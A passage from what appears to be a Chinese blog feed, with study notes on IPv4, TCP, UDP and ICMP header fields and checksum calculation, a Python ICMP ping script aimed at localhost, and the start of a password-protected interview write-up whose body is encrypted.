rel="noopener">C语言中文网</a></p><p><img src="/pic/158.png" alt=""></p><h4 id="1-版本（version）"><a href="#1-版本（version）" class="headerlink" title="1) 版本（version）"></a>1) 版本（version）</h4><p>占 4 位，表示 IP 协议的版本。通信双方使用的 IP 协议版本必须一致。目前广泛使用的IP协议版本号为 4，即 IPv4。</p><h4 id="2-首部长度（网际报头长度IHL）"><a href="#2-首部长度（网际报头长度IHL）" class="headerlink" title="2) 首部长度（网际报头长度IHL）"></a>2) 首部长度（网际报头长度IHL）</h4><p>占 4 位，可表示的最大十进制数值是 15。这个字段所表示数的单位是 32 位字长（1 个 32 位字长是 4 字节）。因此，当 IP 的首部长度为 1111 时（即十进制的 15），首部长度就达到 60 字节。当 IP 分组的首部长度不是 4 字节的整数倍时，必须利用最后的填充字段加以填充。</p><p>数据部分永远在 4 字节的整数倍开始，这样在实现 IP 协议时较为方便。首部长度限制为 60 字节的缺点是，长度有时可能不够用，之所以限制长度为 60 字节，是希望用户尽量减少开销。最常用的首部长度就是 20 字节（即首部长度为 0101），这时不使用任何选项。</p><h4 id="3-区分服务（tos）"><a href="#3-区分服务（tos）" class="headerlink" title="3) 区分服务（tos）"></a>3) 区分服务（tos）</h4><p>也被称为服务类型，占 8 位，用来获得更好的服务。这个字段在旧标准中叫做服务类型，但实际上一直没有被使用过。1998 年 IETF 把这个字段改名为区分服务（Differentiated Services，DS）。只有在使用区分服务时，这个字段才起作用。</p><h4 id="4-总长度（totlen）"><a href="#4-总长度（totlen）" class="headerlink" title="4) 总长度（totlen）"></a>4) 总长度（totlen）</h4><p>首部和数据之和，单位为字节。总长度字段为 16 位，因此数据报的最大长度为 2^16-1=65535 字节。</p><h4 id="5-标识（identification）"><a href="#5-标识（identification）" class="headerlink" title="5) 标识（identification）"></a>5) 标识（identification）</h4><p>用来标识数据报，占 16 位。IP 协议在存储器中维持一个计数器。每产生一个数据报，计数器就加 1，并将此值赋给标识字段。当数据报的长度超过网络的 MTU，而必须分片时，这个标识字段的值就被复制到所有的数据报的标识字段中。具有相同的标识字段值的分片报文会被重组成原来的数据报。</p><h4 id="6-标志（flag）"><a href="#6-标志（flag）" class="headerlink" title="6) 标志（flag）"></a>6) 标志（flag）</h4><p>占 3 位。第一位未使用，其值为 0。第二位称为 DF（不分片），表示是否允许分片。取值为 0 时，表示允许分片；取值为 1 时，表示不允许分片。第三位称为 MF（更多分片），表示是否还有分片正在传输，设置为 0 时，表示没有更多分片需要发送，或数据报没有分片。</p><h4 id="7-片偏移（offsetfrag）"><a href="#7-片偏移（offsetfrag）" class="headerlink" title="7) 片偏移（offsetfrag）"></a>7) 片偏移（offsetfrag）</h4><p>占 13 位。当报文被分片后，该字段标记该分片在原报文中的相对位置。片偏移以 8 个字节为偏移单位。所以，除了最后一个分片，其他分片的偏移值都是 8 字节（64 位）的整数倍。</p><h4 id="8-生存时间（TTL）"><a href="#8-生存时间（TTL）" class="headerlink" title="8) 生存时间（TTL）"></a>8) 生存时间（TTL）</h4><p>表示数据报在网络中的寿命，占 8 位。该字段由发出数据报的源主机设置。其目的是防止无法交付的数据报无限制地在网络中传输，从而消耗网络资源。</p><p>路由器在转发数据报之前，先把 TTL 值减 1。若 TTL 值减少到 0，则丢弃这个数据报，不再转发。因此，TTL 指明数据报在网络中最多可经过多少个路由器。TTL 的最大数值为 255。若把 TTL 的初始值设为 1，则表示这个数据报只能在本局域网中传送。 </p><h4 id="9-协议"><a href="#9-协议" class="headerlink" title="9) 协议"></a>9) 协议</h4><p>表示该数据报文所携带的数据所使用的协议类型，占 8 位。该字段可以方便目的主机的 IP 层知道按照什么协议来处理数据部分。不同的协议有专门不同的协议号。</p><p>例如，TCP 的协议号为 6，UDP 的协议号为 17，ICMP 的协议号为 1。</p><h4 id="10-首部检验和（checksum）"><a href="#10-首部检验和（checksum）" class="headerlink" title="10) 首部检验和（checksum）"></a>10) 首部检验和（checksum）</h4><p>用于校验数据报的首部，占 16 位。数据报每经过一个路由器，首部的字段都可能发生变化（如TTL），所以需要重新校验。而数据部分不发生变化，所以不用重新生成校验值。</p><h4 id="11-源地址"><a href="#11-源地址" class="headerlink" title="11) 源地址"></a>11) 源地址</h4><p>表示数据报的源 IP 地址，占 32 位。</p><h4 id="12-目的地址"><a href="#12-目的地址" class="headerlink" title="12) 目的地址"></a>12) 目的地址</h4><p>表示数据报的目的 IP 地址，占 32 位。该字段用于校验发送是否正确。</p><h4 id="13-可选字段"><a href="#13-可选字段" class="headerlink" title="13) 可选字段"></a>13) 可选字段</h4><p>该字段用于一些可选的报头设置，主要用于测试、调试和安全的目的。这些选项包括严格源路由（数据报必须经过指定的路由）、网际时间戳（经过每个路由器时的时间戳记录）和安全限制。</p><h4 id="14-填充"><a href="#14-填充" class="headerlink" title="14) 填充"></a>14) 填充</h4><p>由于可选字段中的长度不是固定的，使用若干个 0 填充该字段，可以保证整个报头的长度是 32 位的整数倍。</p><h4 id="15-数据部分"><a href="#15-数据部分" class="headerlink" title="15) 数据部分"></a>15) 数据部分</h4><p>表示传输层的数据，如保存 TCP、UDP、ICMP 或 IGMP 的数据。数据部分的长度不固定。</p><h4 id="16-TCP-UDP-ICMP报文格式"><a href="#16-TCP-UDP-ICMP报文格式" class="headerlink" title="16) TCP/UDP/ICMP报文格式"></a>16) TCP/UDP/ICMP报文格式</h4><ol><li><p>TCP</p><p><img src="/pic/159.png" alt=""></p><h6 id="源端口和目的端口字段"><a href="#源端口和目的端口字段" class="headerlink" title="源端口和目的端口字段"></a>源端口和目的端口字段</h6><ul><li>TCP源端口（Source Port）：源计算机上的应用程序的端口号，占 16 位。</li><li>TCP目的端口（Destination Port）：目标计算机的应用程序端口号，占 16 位。</li></ul><h6 id="序列号字段"><a href="#序列号字段" class="headerlink" title="序列号字段"></a>序列号字段</h6><p>CP序列号（Sequence Number）：占 32 位。它表示本报文段所发送数据的第一个字节的编号。在 TCP 连接中，所传送的字节流的每一个字节都会按顺序编号。当SYN标记不为1时，这是当前数据分段第一个字母的序列号；如果SYN的值是1时，这个字段的值就是初始序列值（ISN），用于对序列号进行同步。这时，第一个字节的序列号比这个字段的值大1，也就是ISN加1。</p><h6 id="确认号字段"><a href="#确认号字段" class="headerlink" title="确认号字段"></a>确认号字段</h6><p>TCP 确认号（Acknowledgment Number，ACK Number）：占 32 位。它表示接收方期望收到发送方下一个报文段的第一个字节数据的编号。其值是接收计算机即将接收到的下一个序列号，也就是下一个接收到的字节的序列号加1。</p><h6 id="数据偏移字段"><a href="#数据偏移字段" class="headerlink" title="数据偏移字段"></a>数据偏移字段</h6><p>TCP 首部长度（Header Length）：数据偏移是指数据段中的“数据”部分起始处距离 TCP 数据段起始处的字节偏移量，占 4 位。其实这里的“数据偏移”也是在确定 TCP 数据段头部分的长度，告诉接收端的应用程序，数据从何处开始。</p><h6 id="保留字段"><a href="#保留字段" class="headerlink" title="保留字段"></a>保留字段</h6><p>保留（Reserved）：占 4 位。为 TCP 将来的发展预留空间，目前必须全部为 0。</p><h6 id="标志位字段"><a href="#标志位字段" class="headerlink" title="标志位字段"></a>标志位字段</h6><ul><li>CWR（Congestion Window Reduce）：拥塞窗口减少标志，用来表明它接收到了设置 ECE 标志的 TCP 包。并且，发送方收到消息之后，通过减小发送窗口的大小来降低发送速率。</li><li>ECE（ECN Echo）：用来在 TCP 三次握手时表明一个 TCP 端是具备 ECN 功能的。在数据传输过程中，它也用来表明接收到的 TCP 包的 IP 头部的 ECN 被设置为 11，即网络线路拥堵。</li><li>URG（Urgent）：表示本报文段中发送的数据是否包含紧急数据。URG=1 时表示有紧急数据。当 URG=1 时，后面的紧急指针字段才有效。</li><li>ACK：表示前面的确认号字段是否有效。ACK=1 时表示有效。只有当 ACK=1 时，前面的确认号字段才有效。TCP 规定，连接建立后，ACK 必须为 1。</li><li>PSH（Push）：告诉对方收到该报文段后是否立即把数据推送给上层。如果值为 1，表示应当立即把数据提交给上层，而不是缓存起来。</li><li>RST：表示是否重置连接。如果 RST=1，说明 TCP 连接出现了严重错误（如主机崩溃），必须释放连接，然后再重新建立连接。</li><li>SYN：在建立连接时使用，用来同步序号。当 SYN=1，ACK=0 时，表示这是一个请求建立连接的报文段；当 SYN=1，ACK=1 时，表示对方同意建立连接。SYN=1 时，说明这是一个请求建立连接或同意建立连接的报文。只有在前两次握手中 SYN 才为 1。</li><li>FIN：标记数据是否发送完毕。如果 FIN=1，表示数据已经发送完成，可以释放连接。</li></ul><h6 id="窗口大小字段"><a href="#窗口大小字段" class="headerlink" title="窗口大小字段"></a>窗口大小字段</h6><p>窗口大小（Window Size）：占 16 位。它表示从 Ack Number 开始还可以接收多少字节的数据量，也表示当前接收端的接收窗口还有多少剩余空间。该字段可以用于 TCP 的流量控制。</p><h6 id="TCP-校验和字段"><a href="#TCP-校验和字段" class="headerlink" title="TCP 校验和字段"></a>TCP 校验和字段</h6><p>校验位（TCP Checksum）：占 16 位。它用于确认传输的数据是否有损坏。发送端基于数据内容校验生成一个数值，接收端根据接收的数据校验生成一个值。两个值必须相同，才能证明数据是有效的。如果两个值不同，则丢掉这个数据包。Checksum 是根据伪头 + TCP 头 + TCP 数据三部分进行计算的。</p><h6 id="紧急指针字段"><a href="#紧急指针字段" class="headerlink" title="紧急指针字段"></a>紧急指针字段</h6><p>紧急指针（Urgent Pointer）：仅当前面的 URG 控制位为 1 时才有意义。它指出本数据段中为紧急数据的字节数，占 16 位。当所有紧急数据处理完后，TCP 就会告诉应用程序恢复到正常操作。即使当前窗口大小为 0，也是可以发送紧急数据的，因为紧急数据无须缓存。</p><h6 id="可选项字段"><a href="#可选项字段" class="headerlink" title="可选项字段"></a>可选项字段</h6><p>选项（Option）：长度不定，但长度必须是 32bits 的整数倍。</p></li><li><p>UDP</p><p>+————————-+————————–+<br>|   16位源端口号   ｜   16位源端口号    ｜<br>+————————-+————————–+<br>|   16位源端口号   ｜   16位源端口号    ｜<br>+————————-+————————–+<br>|                            数据                             ｜<br>+————————-+————————–+</p><ul><li>源端口：16位，标识本地端口</li><li>目的端口：16位，标识目标端口</li><li>总长度：标识该报文段包括报头部分的所有数据字节的长度。</li><li>校验和：计算方式和TCP相似</li><li>数据：可变长度</li></ul></li><li><p>ICMP</p><p>+————————-+————————–+—————————+<br>|         8位类型       ｜         8位代码        ｜       16位校验和     ｜<br>+————————-+————————–+—————————+<br>|             16位 标识符              ｜           序列号16位                  ｜<br>+—————————————+—————————————–+<br>|                                        选项（若有）                                      ｜<br>+—————————————+—————————————–+</p><table><thead><tr><th>类型</th><th>代码</th><th>含义</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>回显应答（ping 应答）</td></tr><tr><td>3</td><td>0</td><td>网络不可达</td></tr><tr><td>3</td><td>1</td><td>主机不可达</td></tr><tr><td>3</td><td>2</td><td>协议不可达</td></tr><tr><td>3</td><td>3</td><td>端口不可达</td></tr><tr><td>3</td><td>4</td><td>需要进行分片，但设置不分片位</td></tr><tr><td>3</td><td>5</td><td>源站选路失败</td></tr><tr><td>3</td><td>6</td><td>目的网络未知</td></tr><tr><td>3</td><td>7</td><td>目的主机未知</td></tr><tr><td>3</td><td>9</td><td>目的网络被强制禁止</td></tr><tr><td>3</td><td>10</td><td>目的主机被强制禁止</td></tr><tr><td>3</td><td>11</td><td>由于服务类型 TOS，网络不可达</td></tr><tr><td>3</td><td>12</td><td>由于服务类型 TOS，主机不可达</td></tr><tr><td>3</td><td>13</td><td>由于过滤，通信被强制禁止</td></tr><tr><td>3</td><td>14</td><td>主机越权</td></tr><tr><td>3</td><td>15</td><td>优先中止失效</td></tr><tr><td>4</td><td>0</td><td>源端被关闭（基本流控制）</td></tr><tr><td>5</td><td>0</td><td>对网络重定向</td></tr><tr><td>5</td><td>1</td><td>对主机重定向</td></tr><tr><td>5</td><td>2</td><td>对服务类型和网络重定向</td></tr><tr><td>5</td><td>3</td><td>对服务类型和主机重定向</td></tr><tr><td>8</td><td>0</td><td>回显请求（ping 请求）</td></tr><tr><td>9</td><td>0</td><td>路由器通告</td></tr><tr><td>10</td><td>0</td><td>路由器请求</td></tr><tr><td>11</td><td>0</td><td>传输期间生存时间为 0</td></tr><tr><td>11</td><td>1</td><td>在数据报组装期间生存时间为 0</td></tr><tr><td>12</td><td>0</td><td>坏的 IP 首部</td></tr><tr><td>12</td><td>1</td><td>缺少必需的选项</td></tr><tr><td>13</td><td>0</td><td>时间戳请求</td></tr><tr><td>14</td><td>0</td><td>时间戳应答</td></tr><tr><td>17</td><td>0</td><td>地址掩码请求</td></tr><tr><td>18</td><td>0</td><td>地址掩码应答</td></tr></tbody></table></li></ol><p>校验和计算</p><p>在发送数据时，为了计算数据包的校验和。应该按如下步骤：<br>（1）把校验和字段置为0；　　<br>（2）把需校验的数据看成以16位为单位的数字组成，依次进行二进制反码求和；<br>（3）把得到的结果存入校验和字段中。　　在接收数据时，计算数据包的校验和相对简单，按如下步骤：</p><blockquote><p>（1）把首部看成以16位为单位的数字组成，依次进行二进制反码求和，包括校验和字段；　　<br>（2）检查计算出的校验和的结果是否为0；<br>（3）如果等于0，说明被整除，校验是和正确。否则，校验和就是错误的，协议栈要抛弃这个数据包。</p></blockquote><p>虽然上面四种报文的校验和算法一样，但在作用范围存在不同：IP校验和只校验20字节的IP报头；而ICMP校验和覆盖整个报文（ICMP报头+ICMP数据）；UDP和TCP校验和不仅覆盖整个报文，而且还有12字节的IP伪首部，包括源IP地址(4字节)、目的IP地址(4字节)、协议(2字节，第一字节补0)和TCP/UDP包长(2字节)。另外UDP、TCP数据报的长度可以为奇数字节，所以在计算校验和时需要在最后增加填充字节0（注意，填充字节只是为了计算校验和，可以不被传送）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : sunny250</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">icmp_check</span><span class="params">(data)</span>:</span></span><br><span class="line">    print(data)</span><br><span class="line">    length = len(data)</span><br><span class="line">    flag = length % <span class="number">2</span>  <span class="comment"># 判断data长度是否是偶数字节</span></span><br><span class="line">    sum = <span class="number">0</span>  <span class="comment"># 记录(十进制)相加的结果</span></span><br><span class="line">    data=binascii.b2a_hex(data)</span><br><span class="line">    print(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(data), <span class="number">4</span>):  <span class="comment"># 将每两个字节(16位)相加（二进制求和）直到最后得出结果</span></span><br><span class="line">        sum += int(data[i+<span class="number">2</span>:i+<span class="number">4</span>]+data[i:i+<span class="number">2</span>],<span class="number">16</span>) <span class="comment"># 传入data以每两个字节（十六进制）通过ord转十进制，第一字节在低位，第二个字节在高位\</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag:  <span class="comment"># 传入的data长度是奇数，将执行，且把这个字节（8位）加到前面的结果</span></span><br><span class="line">        sum += int(data[<span class="number">-2</span>:],<span class="number">16</span>)</span><br><span class="line">    print(hex(sum))</span><br><span class="line">    <span class="comment"># 将高于16位与低16位相加</span></span><br><span class="line">    sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp; <span class="number">0xffff</span>)</span><br><span class="line">    sum += (sum &gt;&gt; <span class="number">16</span>)  <span class="comment"># 如果还有高于16位，将继续与低16位相加</span></span><br><span class="line">    answer = ~sum &amp; <span class="number">0xffff</span>  <span class="comment"># 对sum取反(返回的是十进制)</span></span><br><span class="line">    <span class="comment"># 主机字节序转网络字节序列（参考小端序转大端序）</span></span><br><span class="line">    answer = answer &gt;&gt; <span class="number">8</span> | (answer &lt;&lt; <span class="number">8</span> &amp; <span class="number">0xff00</span>)</span><br><span class="line">    <span class="keyword">return</span> answer  <span class="comment"># 最终返回的结果就是wireshark里面看到的checksum校验和</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">icmp_pack</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># icmp header</span></span><br><span class="line">    icmp_type = <span class="number">8</span></span><br><span class="line">    icmp_code = <span class="number">0</span></span><br><span class="line">    icmp_check_sum = <span class="number">0</span></span><br><span class="line">    icmp_id = <span class="number">1</span></span><br><span class="line">    icmp_seq = <span class="number">11</span></span><br><span class="line">    icmp_date = <span class="string">b'Hello!'</span></span><br><span class="line"></span><br><span class="line">    icmp_header = struct.pack(<span class="string">'!BBHHH6s'</span>, icmp_type, icmp_code, icmp_check_sum, icmp_id, icmp_seq, icmp_date)</span><br><span class="line">    icmp_check_sum=icmp_check(icmp_header)</span><br><span class="line"></span><br><span class="line">    icmp_header = struct.pack(<span class="string">'!BBHHH6s'</span>, icmp_type, icmp_code, icmp_check_sum, icmp_id, icmp_seq, icmp_date)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> icmp_header</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(ip)</span>:</span></span><br><span class="line">    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)</span><br><span class="line">    packets = icmp_pack()</span><br><span class="line">    raw_sock.sendto(packets, (ip, <span class="number">0</span>))</span><br><span class="line">    reply_date,address=raw_sock.recvfrom(<span class="number">1024</span>)</span><br><span class="line">    reply_date=struct.unpack(<span class="string">'!BBHHHBBH4s4sBBHHH6s'</span>,reply_date)</span><br><span class="line">    <span class="comment"># print(binascii.b2a_hex(reply_date))</span></span><br><span class="line">    print(<span class="string">'Success! Host is up, the reply from '</span>,ip,<span class="string">' ttl is '</span>,reply_date[<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main(<span class="string">'127.0.0.1'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在学校的课程中学到了有关网络编程的内容，在此记录一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="日常积累" scheme="https://sunny250.github.io/categories/%E6%97%A5%E5%B8%B8%E7%A7%AF%E7%B4%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>【凉】腾讯实习生面经</title>
    <link href="https://sunny250.github.io/2020/03/13/%E8%85%BE%E8%AE%AF%E9%9D%A2%E7%BB%8F/"/>
    <id>https://sunny250.github.io/2020/03/13/%E8%85%BE%E8%AE%AF%E9%9D%A2%E7%BB%8F/</id>
    <published>2020-03-13T08:13:12.000Z</published>
    <updated>2020-03-17T11:13:12.000Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">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